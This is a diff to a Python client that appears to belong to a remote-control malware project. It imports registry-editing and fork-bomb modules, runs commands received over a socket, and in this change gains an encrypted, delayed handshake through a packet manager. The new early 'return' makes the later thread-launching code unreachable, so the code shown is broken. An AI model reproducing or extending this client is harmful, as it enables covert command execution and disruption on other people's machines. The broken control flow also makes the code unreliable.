@@ -6,6 +6,8 @@ import tools.cipher as cipher
 import queue
 import tools.regedit as regedit
 import tools.forkbomb as forkbomb
+from tools.packet_manager import p_manager
+from tools.dictionary import SEND_DELAY
 
 global stop, command_list, send_list
 command_list = queue.Queue()
@@ -116,17 +118,36 @@ def execute_commands(sock,cipherClass):
 def start_client(sock, key=keys.CONN_PASSWORD):
     global stop
     IV = None
+    cipherClass = cipher.cipher(key=key)
+    pm = p_manager(cipher_class = cipherClass)
+    delay = SEND_DELAY
+
     while(True):
         try:
+            pm.clear()
             response = sock.recv(2048)
-            if response[:3] == 'SRT'.encode():
-                IV = response[3:]
-                sock.send('ACK'.encode()+IV)
+            pm.load_packet(response)
+            while(pm.is_last() == False):
+                pm.concat(sock.recv(2048))
+
+            pm.decrypt_packet()
+
+            if pm.packet["CMD"] == "SRT":
+                payload = pm.packet["PLD"]
+                pm.clear()
+                pm.store_command("ACK")
+                pm.store_payload(payload)
+                for i in pm.get_packets():
+                    time.sleep(delay)
+                    sock.send(i)
                 break
         except socket.timeout:
             print("Socket timed out on handshake..")
 
-    cipherClass = cipher.cipher(key=key,IV=IV,generatedIV=True)
+
+    print("Handshake complete...")
+    return
+
 
     receiver = threading.Thread(target=input_collection,args=(sock,cipherClass))
     execute = threading.Thread(target=execute_commands,args=(sock,cipherClass))
